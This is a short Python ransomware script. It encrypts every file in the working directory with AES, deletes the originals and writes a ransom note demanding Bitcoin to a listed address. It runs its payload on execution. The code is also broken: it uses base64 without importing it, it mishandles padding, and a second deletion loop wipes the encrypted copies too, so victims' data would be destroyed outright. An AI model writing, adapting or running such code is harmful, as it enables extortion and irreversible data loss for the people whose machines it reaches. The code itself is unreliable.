#!/usr/bin/python3

import os
import sys
import time
import random
import string
import shutil
import socket
import urllib.request

from Crypto.Cipher import AES
from Crypto import Random

BLOCK_SIZE = 16

PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: str(base64.b64encode(c.encrypt(pad(s))))[2:-1]

secret = os.urandom(BLOCK_SIZE)
print(secret)
cipher = AES.new(secret, AES.MODE_ECB)

#Encode
encoded = EncodeAES(cipher, 'password')
print('Encrypted string:', encoded)

#Encrypt a file
def encrypt_file(file_name):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = cipher.encrypt(plaintext)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(enc)
    os.remove(file_name)

#Encrypt all files in a directory
def encrypt_dir(dir_name):
    for root, dirs, files in os.walk(dir_name):
        for file in files:
            if (file != "encrypt_dir.py"):
                encrypt_file(os.path.join(root,file))
                
#Ransomware
def ransomware():
    #Create encrypted and decrypted copies of all files
    encrypt_dir(os.getcwd())

    #Delete original files
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if (file != "encrypt_dir.py"):
                os.remove(os.path.join(root,file))

    #Create ransom note
    with open("ransom_note.txt", "w") as f:
        f.write("Your files have been encrypted!\n")
        f.write("To decrypt them, send 0.5 Bitcoin to the following address:\n")
        f.write("1HsxDbg6XHEOzKWtyN6Vy5TJLRKFYxHL1L\n")
        f.write("Then, contact me at the following email to get the decryption key:\n")
        f.write("ransom@example.com")

ransomware()                
